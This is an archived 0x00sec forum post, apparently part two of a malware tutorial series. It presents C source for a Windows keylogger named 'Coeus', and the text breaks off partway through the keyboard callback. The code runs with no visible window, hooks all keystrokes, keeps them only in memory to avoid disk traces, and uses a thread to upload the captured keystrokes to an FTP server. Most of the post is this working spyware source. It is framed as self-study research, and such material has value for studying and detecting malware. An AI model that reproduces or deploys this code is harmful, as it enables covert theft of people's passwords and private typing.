<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>Windows Keylogging - Part II - Malware - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="Disclaimer: The synchronisation code is broken since it was written when I had very little knowledge of how it worked. 
Following from my previous paper, Windows Keylogging - Part I, I will be showcasing and explaining a&amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="1070.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="bkTQZWopyvXT1KkNFItWMKnpe"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="bkTQZWopyvXT1KkNFItWMKnpe"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Windows Keylogging - Part II&#39;" href="1070.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/windows-keylogging-part-ii/1070" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/windows-keylogging-part-ii/1070" />
<meta property="og:title" content="Windows Keylogging - Part II" />
<meta name="twitter:title" content="Windows Keylogging - Part II" />
<meta property="og:description" content="Disclaimer: The synchronisation code is broken since it was written when I had very little knowledge of how it worked.  Following from my previous paper, Windows Keylogging - Part I, I will be showcasing and explaining an example implementation of a Windows keylogger named Coeus, after the titan Coeus of Greek mythology, who represents intelligence. Note that this is one possible implementation and is not necessarily the best. To properly understand the paper, it is highly recommended that the r..." />
<meta name="twitter:description" content="Disclaimer: The synchronisation code is broken since it was written when I had very little knowledge of how it worked.  Following from my previous paper, Windows Keylogging - Part I, I will be showcasing and explaining an example implementation of a Windows keylogger named Coeus, after the titan Coeus of Greek mythology, who represents intelligence. Note that this is one possible implementation and is not necessarily the best. To properly understand the paper, it is highly recommended that the r..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta property="og:article:tag" content="keylogger" />
<meta property="og:article:tag" content="malware" />
<meta property="og:article:tag" content="winapi" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="7 mins ðŸ•‘" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="22 â¤" />
<meta property="article:published_time" content="2016-09-10T11:05:04+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="1070.html">Windows Keylogging - Part II</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/malware/56.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #F7941D'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Malware</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

      <div class="topic-category">
        <div class='discourse-tags list-tags'>
            <a href='../../tag/keylogger.html' class='discourse-tag' rel="tag">keylogger</a>, 
            <a href='../../tag/malware.html' class='discourse-tag' rel="tag">malware</a>, 
            <a href='../../tag/winapi.html' class='discourse-tag' rel="tag">winapi</a>
        </div>
      </div>
  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='Windows Keylogging - Part II'>
      <link itemprop='url' href='1070.html'>
      <meta itemprop='datePublished' content='2016-09-10T11:05:03Z'>
        <meta itemprop='articleSection' content='Malware'>
      <meta itemprop='keywords' content='keylogger, malware, winapi'>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/dtm.html'><span itemprop='name'>dtm</span></a>
                
              </span>

                <link itemprop="mainEntityOfPage" href="1070.html">


              <span class="crawler-post-infos">
                  <time  datetime='2016-09-10T11:05:04Z' class='post-time'>
                    September 10, 2016, 11:05am
                  </time>
                  <meta itemprop='dateModified' content='2018-06-03T01:42:08Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p><strong>Disclaimer</strong>: The synchronisation code is broken since it was written when I had very little knowledge of how it worked.</p>
<p>Following from my previous paper, <a href="../../../external.html?link=https://0x00sec.org/t/windows-keylogging-part-i/99">Windows Keylogging - Part I</a>, I will be showcasing and explaining an example implementation of a Windows keylogger named <code>Coeus</code>, after the titan Coeus of Greek mythology, who represents intelligence. Note that this is one possible implementation and is not necessarily the best. To properly understand the paper, it is highly recommended that the reader look over the implementation of a basic keylogger using a keyboard hook (which I have detailed in the previous part) and also its prerequisites which include:</p>
<pre><code class="lang-makefile">Proficiency in C/C++
Knowledge of the WinAPI and its documentation
Knowledge of Windows messages and message queues
Knowledge of Windows hooks
Recommended knowledge of multi-threading
Recommended knowledge of Mutual Exclusions
Recommended knowledge of FTP
</code></pre>
<p><strong>Disclaimer</strong>: This paper is not a how-to on making malware, rather it is a report on my research from self-study and experimentation on malware and Windows internals. As a consequence, I apologize in advance for any incorrect information which may be provided. If there is any feedback on this, please leave a reply or private message me and I will address it as soon as possible.</p>
<p>Also any apologies if my code (especially the multithreading) is terrible. Not all hackers are the best programmers.</p>
<hr>
<h2>Keylogging Functionality</h2>
<p>Recall that the most basic of keyloggers should record the keystrokes as analyzed in the previous paper. For my implementation, some extra functionality will be included to make it more plausible and effective in doing its job in the outside world. As a natural result, the code will be slightly more advanced than what was already covered. The features of the keylogger are as follows:</p>
<pre><code class="lang-makefile">Threaded keystroke logging using Windows hooks
Threaded keystroke uploads using FTP
Zero disk activity
</code></pre>
<p>Using Windows hooks to capture keystrokes is a common method utilized by many existing keyloggers. A reason why it may be is because it takes advantage of threading and events which makes it efficient in the aspect of CPU consumption. Another, with regards to malware, many legitimate programs could also implement this function to achieve their own goals.</p>
<p>A vital problem with older generations of malware is that they write the keystrokes to disk and because of this, it generates some noise when doing so which could lead to its undoing. One way to combat this weakness is to directly process all keystrokes within memory and push them out through the network. Of course, this does have its downsides. If the program is always constantly sending the keystrokes out, it will become suspicious however, the rate at which this happens can be controlled to some extent.</p>
<hr>
<h1>Coding the Keylogger</h1>
<p>Before we see any of the code in the functions, let me introduce the headers, macros and global variable declarations.</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;Windows.h&gt;
#include &lt;WinInet.h&gt;
#include &lt;ShlObj.h&gt;

#pragma comment(lib, "WININET")

#define DEBUG

#define NAME "Coeus"

// FTP settings
#define FTP_SERVER "127.0.0.1"
#define FTP_USERNAME "dtm"
#define FTP_PASSWORD "mySup3rSecr3tPassw0rd"
#define FTP_LOG_PATH "Coeus_Log.txt"

#define MAX_LOG_SIZE 4096
#define BUF_SIZ 1024
#define BUF_LEN 1
#define MAX_VALUE_NAME 16383

#define ONE_SECOND 1000
#define ONE_MINUTE ONE_SECOND * 60
#define TIMEOUT ONE_MINUTE * 1 // minutes

// global handle to hook
HHOOK ghHook = NULL;
// global handle to mutex
HANDLE ghMutex = NULL;

// global handle to log heap
HANDLE ghLogHeap = NULL;
// global string pointer to log buffer
LPSTR lpLogBuf = NULL;
// current max size of log buffer
DWORD dwLogBufSize = 0;

// global handle to temporary buffer heap
HANDLE ghTempHeap = NULL;
// global handle to temporary buffer
LPSTR lpTempBuf = NULL;

// multithreading objects
HANDLE hTempBufHasData = NULL;
HANDLE hTempBufNoData = NULL;
</code></pre>
<p>Global variables arenâ€™t really a <em>nice</em> method of doing things however, for the sake of simplicity of using variables across multiple threads, this was one of the options I chose. Most of these variables are just handles to the two buffers which are used with the multithreading, for example, <code>lpLogBuf</code> is the pointer to the buffer which contains the keystrokes and <code>lpTempBuf</code> is the pointer to the buffer which contains the data to be uploaded to the FTP server. The two multithreading objects <code>hTempBufHasData</code> and <code>hTempBufNoData</code> are used to signal whether the temporary buffer (upload buffer) has or has no data to upload, respectively.</p>
<p>So now letâ€™s take a look at the main function.</p>
<hr>
<h2><code>main</code></h2>
<p>The following is the pseudocode of the <code>WinMain</code> function.</p>
<pre><code class="lang-makefile">Main
1. Create mutex to prevent more than one instance
2. Create two buffers, one to hold the keystrokes, one to upload the keystrokes
3. Initialize two events for the two buffers with multithreading
4. Start a thread to upload the keystrokes
5. Create the keyboard hook
6. Enter message loop to process keystrokes
</code></pre>
<p>Here is the code for the main function. We declare it with <code>WinMain</code> for a Windows GUI application which shows no window since there is no actual GUI code nor does it show a console since it is not a console application. In this function, we are needed to set up all the variables and other objects for the program to work, then simply enter an infinite loop to capture keystrokes.</p>
<pre><code class="lang-auto">int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPCSTR lpCmdLine, int nCmdShow) {
    // mutex to prevent other keylog instances
    ghMutex = CreateMutex(NULL, TRUE, NAME);
    if (ghMutex == NULL) {
        Fatal("Create mutex");
    }
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        Fatal("Mutex already exists");
        ExitProcess(1);
    }

    // declare handle cleaner on exit
    atexit(CleanUp);

    // allocate heap buffer
    ghLogHeap = HeapCreate(0, BUF_SIZ + 1, 0);
    if (ghLogHeap == NULL) {
        Fatal("Heap create");
    }

    lpLogBuf = (LPSTR)HeapAlloc(ghLogHeap, HEAP_ZERO_MEMORY, BUF_SIZ + 1);
    if (lpLogBuf == NULL) {
        Fatal("Heap alloc");
    }
    dwLogBufSize = BUF_SIZ + 1;

    ghTempHeap = HeapCreate(0, dwLogBufSize, 0);
    if (ghTempHeap == NULL) {
        Fatal("Temp heap create");
    }

    lpTempBuf = (LPSTR)HeapAlloc(ghTempHeap, HEAP_ZERO_MEMORY, dwLogBufSize);
    if (lpTempBuf == NULL) {
        Fatal("Temp heap alloc");
    }

    // multithreading set up
    hTempBufHasData = CreateEvent(NULL, TRUE, FALSE, NULL);
    hTempBufNoData = CreateEvent(NULL, TRUE, TRUE, NULL);

    // create thread to send log file to ftp server
    if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FTPSend, NULL, 0, NULL) == NULL) {
        Fatal("Create thread");
    }

    // set keyboard hooking subroutine
    ghHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (ghHook == NULL) {
        Fatal("Failed to set keyboard hook");
    }

    MSG msg;
    while (GetMessage(&amp;msg, 0, 0, 0) != 0) {
        TranslateMessage(&amp;msg);
        DispatchMessage(&amp;msg);    
    }

    UnhookWindowsHookEx(ghHook);

    return 0;
}
</code></pre>
<p>We require a mutex to prevent duplicate instances being run at the same time. Once weâ€™ve done that, we can initialize the two heaps for our two buffers and the multithreading objects. The <code>lpTempBuf</code> buffer obviously starts with no data so we create the <code>hTempBufNoData</code> initial state as <code>TRUE</code> and the <code>hTempBufHasData</code> with <code>FALSE</code>. Weâ€™ll then create the thread for the FTP uploading routine and then set a hook on keyboard messages. Once weâ€™ve set up everything we require, we place the main function in a message loop to retrieve keystrokes. To capture the keystrokes, we need to set up our <code>LowLevelKeyboardProc</code> function accordingly.</p>
<hr>
<h2><code>LowLevelKeyboardProc</code></h2>
<p>The following is the pseudocode of the <code>LowLevelKeyboardProc</code> function.</p>
<pre><code class="lang-makefile">LowLevelKeyboardProc
1. Check if message is a keyboard message
2. Check if key is either pressed or held
3. Parse virtual key code
4. Append the keystroke to the buffer
5. Wait until the upload buffer is empty (already uploaded) if the keystroke buffer is full
6. Else if upload buffer is not ready, skip and end the function
7. If upload buffer is ready, copy keystroke buffer to the upload buffer
8. Signal FTP routine that there is data to upload
9. Zero the keystroke buffer
10. End the function
</code></pre>
<p>This function is declared as the <code>CALLBACK</code> function to process the keystrokes provided by the hook. To record the keystrokes, we need to do some parsing of virtual key codes and some formatting of special keys.</p>
<pre><code class="lang-auto">// callback function when key is pressed
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // wParam and lParam have info about keyboard message
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        // if key is pressed or held
        if (wParam == WM_KEYDOWN) {
            // get string length of log buffer
            DWORD dwLogBufLen = strlen(lpLogBuf);

            // copy vkCode into log buffer
            CHAR key[2];
            DWORD vkCode = kbd-&gt;vkCode;
            // key is 0 - 9
            if (vkCode &gt;= 0x30 &amp;&amp; vkCode &lt;= 0x39) {
                // shift key
                if (GetAsyncKeyState(VK_SHIFT)) {
                    switch (vkCode) {
                        case 0x30:
                            Log(")");
                            break;
                        case 0x31:
                            Log("!");
                            break;
                        case 0x32:
                            Log("@");
                            break;
                        case 0x33:
                            Log("#");
                            break;
                        case 0x34:
                            Log("$");
                            break;
                        case 0x35:
                            Log("%");
                            break;
                        case 0x36:
                            Log("^");
                            break;
                        case 0x37:
                            Log("&amp;");
                            break;
                        case 0x38:
                            Log("*");
                            break;
                        case 0x39:
                            Log("(");
                            break;
                    }
                    // no shift key
                } else {
                    sprintf(key, "%c", vkCode);
                    Log(key);
                }
                // key is a - z
            } else if (vkCode &gt;= 0x41 &amp;&amp; vkCode &lt;= 0x5A) {
                // if lowercase
                if (GetAsyncKeyState(VK_SHIFT) ^ ((GetKeyState(VK_CAPITAL) &amp; 0x0001)) == FALSE)
                    vkCode += 32;
                sprintf(key, "%c", vkCode);
                Log(key);
            // all other keys
            } else {
                switch (vkCode) {
                    case VK_CANCEL:
                        Log("[CANCEL]");
                        break;
                    case VK_BACK:
                        Log("[BACKSPACE]");
                        break;
                    case VK_TAB:
                        Log("[TAB]");
                        break;
                    case VK_CLEAR:
                        Log("[CLEAR]");
                        break;
                    case VK_RETURN:
                        Log("[ENTER]");
                        break;
                    case VK_CONTROL:
                        Log("[CTRL]");
                        break;
                    case VK_MENU:
                        Log("[ALT]");
                        break;
                    case VK_PAUSE:
                        Log("[PAUSE]");
                        break;
                    case VK_CAPITAL:
                        Log("[CAPS LOCK]");
                        break;
                    case VK_ESCAPE:
                        Log("[ESC]");
                        break;
                    case VK_SPACE:
                        Log("[SPACE]");
                        break;
                    case VK_PRIOR:
                        Log("[PAGE UP]");
                        break;
                    case VK_NEXT:
                        Log("[PAGE DOWN]");
                        break;
                    case VK_END:
                        Log("[END]");
                        break;
                    case VK_HOME:
                        Log("[HOME]");
                        break;
                    case VK_LEFT:
                        Log("[LEFT ARROW]");
                        break;
                    case VK_UP:
                        Log("[UP ARROW]");
                        break;
                    case VK_RIGHT:
                        Log("[RIGHT ARROW]");
                        break;
                    case VK_DOWN:
                        Log("[DOWN ARROW]");
                        break;
                    case VK_INSERT:
                        Log("[INS]");
                        break;
                    case VK_DELETE:
                        Log("[DEL]");
                        break;
                    case VK_NUMPAD0:
                        Log("[NUMPAD 0]");
                        break;
                    case VK_NUMPAD1:
                        Log("[NUMPAD 1]");
                        break;
                    case VK_NUMPAD2:
                        Log("[NUMPAD 2]");
                        break;
                    case VK_NUMPAD3:
                        Log("[NUMPAD 3");
                        break;
                    case VK_NUMPAD4:
                        Log("[NUMPAD 4]");
                        break;
                    case VK_NUMPAD5:
                        Log("[NUMPAD 5]");
                        break;
                    case VK_NUMPAD6:
                        Log("[NUMPAD 6]");
                        break;
                    case VK_NUMPAD7:
                        Log("[NUMPAD 7]");
                        break;
                    case VK_NUMPAD8:
                        Log("[NUMPAD 8]");
                        break;
                    case VK_NUMPAD9:
                        Log("[NUMPAD 9]");
                        break;
                    case VK_MULTIPLY:
                        Log("[*]");
                        break;
                    case VK_ADD:
                        Log("[+]");
                        break;
                    case VK_SUBTRACT:
                        Log("[-]");
                        break;
                    case VK_DECIMAL:
                        Log("[.]");
                        break;
                    case VK_DIVIDE:
                        Log("[/]");
                        break;
                    case VK_F1:
                        Log("[F1]");
                        break;
                    case VK_F2:
                        Log("[F2]");
                        break;
                    case VK_F3:
                        Log("[F3]");
                        break;
                    case VK_F4:
                        Log("[F4]");
                        break;
                    case VK_F5:
                        Log("[F5]");
                        break;
                    case VK_F6:
                        Log("[F6]");
                        break;
                    case VK_F7:
                        Log("[F7]");
                        break;
                    case VK_F8:
                        Log("[F8]");
                        break;
                    case VK_F9:
                        Log("[F9]");
                        break;
                    case VK_F10:
                        Log("[F10]");
                        break;
                    case VK_F11:
                        Log("[F11]");
                        break;
                    case VK_F12:
                        Log("[F12]");
                        break;
                    case VK_NUMLOCK:
                        Log("[NUM LOCK]");
                        break;
                    case VK_SCROLL:
                        Log("[SCROLL LOCK]");
                        break;
                    case VK_OEM_PLUS:
                        GetAsyncKeyState(VK_SHIFT) ? Log("+") : Log("=");
                        break;
                    case VK_OEM_COMMA:
                        GetAsyncKeyState(VK_SHIFT) ? Log("&lt;") : Log(",");
                        break;
                    case VK_OEM_MINUS:
                        GetAsyncKeyState(VK_SHIFT) ? Log("_") : Log("-");
                        break;
                    case VK_OEM_PERIOD:
                        GetAsyncKeyState(VK_SHIFT) ? Log("&gt;") : Log(".");
                        break;
                    case VK_OEM_1:
                        GetAsyncKeyState(VK_SHIFT) ? Log(":") : Log(";");
                        break;
                    case VK_OEM_2:
                        GetAsyncKeyState(VK_SHIFT) ? Log("?") : Log("/");
                        break;
                    case VK_OEM_3:
                        GetAsyncKeyState(VK_SHIFT) ? Log("~") : Log("`");
                        break;
                    case VK_OEM_4:
                        GetAsyncKeyState(VK_SHIFT) ? Log("{") : Log("[");
                        break;
                    case VK_OEM_5:
                        GetAsyncKeyState(VK_SHIFT) ? Log("|") : Log("\\");
                        break;
                    case VK_OEM_6:
                        GetAsyncKeyState(VK_SHIFT) ? Log("}") : Log("]");
                        break;
                    case VK_OEM_7:
                        GetAsyncKeyState(VK_SHIFT) ? Log("\"") : Log("'");
                        break;
                }
            }

            // wait until upload buffer is ready
            // if log buffer is at max size, wait until upload is ready
            if (dwLogBufLen == MAX_LOG_SIZE - 1)
                WaitForSingleObject(hTempBufNoData, INFINITE);
            else
                // otherwise, wait for 500 ms 
                if (WaitForSingleObject(hTempBufNoData, 0) == WAIT_TIMEOUT)
                    // ignore if timed out
                    return CallNextHookEx(0, nCode, wParam, lParam);

            // write out to separate buffer
            strcpy(lpTempBuf, lpLogBuf);
            // reset event 
            ResetEvent(hTempBufNoData);
            // signal ftp upload
            SetEvent(hTempBufHasData);

            // reset log buffer size
            ZeroMemory(lpLogBuf, dwLogBufSize);
        }
    }

